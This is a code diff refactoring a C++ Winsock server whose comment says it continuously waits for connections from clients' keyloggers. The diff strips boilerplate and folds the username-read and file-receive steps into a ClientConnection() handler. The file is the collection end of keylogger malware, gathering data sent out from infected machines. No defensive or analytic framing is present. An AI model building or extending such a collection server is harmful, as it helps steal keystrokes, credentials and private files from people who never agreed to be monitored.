@@ -4,9 +4,6 @@
 
 #include "Communication/Communication.h"
 
-#pragma comment (lib, "Ws2_32.lib")
-
-#define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "27017"
 
 int main(void) {
@@ -19,11 +16,6 @@ int main(void) {
     struct addrinfo *result = NULL;
     struct addrinfo hints;
 
-    int iSendResult;
-    char recvbuf[DEFAULT_BUFLEN];
-    int recvbuflen = DEFAULT_BUFLEN;
-    
-    // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
     if (iResult != 0) {
         printf("WSAStartup failed with error: %d\n", iResult);
@@ -36,7 +28,6 @@ int main(void) {
     hints.ai_protocol = IPPROTO_TCP;
     hints.ai_flags = AI_PASSIVE;
 
-    // Resolve the server address and port
     iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
     if ( iResult != 0 ) {
         printf("getaddrinfo failed with error: %d\n", iResult);
@@ -44,7 +35,6 @@ int main(void) {
         return 1;
     }
 
-    // Create a SOCKET for connecting to server
     ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
     if (ListenSocket == INVALID_SOCKET) {
         printf("socket failed with error: %ld\n", WSAGetLastError());
@@ -53,7 +43,6 @@ int main(void) {
         return 1;
     }
 
-    // Setup the TCP listening socket
     iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
     if (iResult == SOCKET_ERROR) {
         printf("bind failed with error: %d\n", WSAGetLastError());
@@ -76,27 +65,17 @@ int main(void) {
     //Server is continuosly waiting for connections from client's keyloggers
     while(true){
         
-        bool end_connection = false;
         SOCKET ClientSocket = INVALID_SOCKET;
-        // Accept a client socket
         ClientSocket = accept(ListenSocket, NULL, NULL);
-        if (end_connection || ClientSocket == INVALID_SOCKET) {
+        if (ClientSocket == INVALID_SOCKET) {
             printf("accept failed with error: %d\n", WSAGetLastError());
             closesocket(ListenSocket);
         }
 
-        ReadUsername(ClientSocket);
-
-        std::cout << RecvFile(ClientSocket, "testi", chunksize_file) << std::endl;
+        //After a connection is established with a client, this method will handle the communication until the end
+        //(it also closes the socket used for the connection)
+        ClientConnection(ClientSocket);
         
-        // shutdown the connection since we're done
-        iResult = shutdown(ClientSocket, SD_SEND);
-        if (iResult == SOCKET_ERROR) {
-            printf("shutdown failed with error: %d\n", WSAGetLastError());
-            closesocket(ClientSocket);
-        }
-
-        closesocket(ClientSocket);
     }
 
     WSACleanup();
